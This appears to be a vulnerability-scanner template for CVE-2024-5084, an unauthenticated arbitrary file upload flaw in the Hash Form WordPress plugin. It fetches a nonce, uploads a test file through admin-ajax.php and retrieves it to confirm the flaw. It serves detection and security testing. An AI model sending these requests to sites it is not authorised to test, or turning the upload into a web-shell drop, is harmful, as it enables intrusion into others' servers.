http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - '"ajax_nounce":"([0-9a-z]+)","preview_img'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(body_2,"success","true","url") && status_code_2 == 200
    - contains(body_3,"{{md5(num)}}") && status_code_3 == 200
    type: dsl
  raw:
  - 'GET / HTTP /1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'POST /wp-admin/admin-ajax.php?action=hashform_file_upload_action&file_uploader_nonce={{nonce}}&allowedExtensions%5B0%5D=txt&sizeLimit=1048576&qqfile={{filename}}.txt
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {{md5(num)}}

    '
  - 'GET /wp-content/uploads/hashform/temp/{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: CVE-2024-5084
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-5084
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99723
    epss-score: 0.92524
  description: 'The Hash Form Drag & Drop Form Builder plugin for WordPress is vulnerable
    to arbitrary file uploads due to missing file type validation in the ''file_upload_action''
    function in all versions up to, and including, 1.1.0. This makes it possible for
    unauthenticated attackers to upload arbitrary files on the affected site''s server
    which may make remote code execution possible.

    '
  impact: 'Attackers can exploit this vulnerability to compromise system security
    and integrity.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: Hash Form
    publicwww-query: /wp-content/plugins/hash-form/
    vendor: HashThemes
    verified: true
  name: Hash Form <= 1.1.0 - Arbitrary File Upload
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-5084
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hash-form/hash-form-drag-drop-form-builder-110-unauthenticated-arbitrary-file-upload-to-remote-code-execution
  - https://github.com/WOOOOONG/CVE-2024-5084/blob/main/CVE-2024-5084_exploit.py
  remediation: 'Apply the latest security patches and updates to address this vulnerability.

    '
  severity: critical
  tags: cve,cve2024,wp-plugin,wordpress,file-upload,rce,intrusive,vuln
variables:
  filename: '{{rand_base(5)}}'
  num: '{{rand_int(1000, 9999)}}'
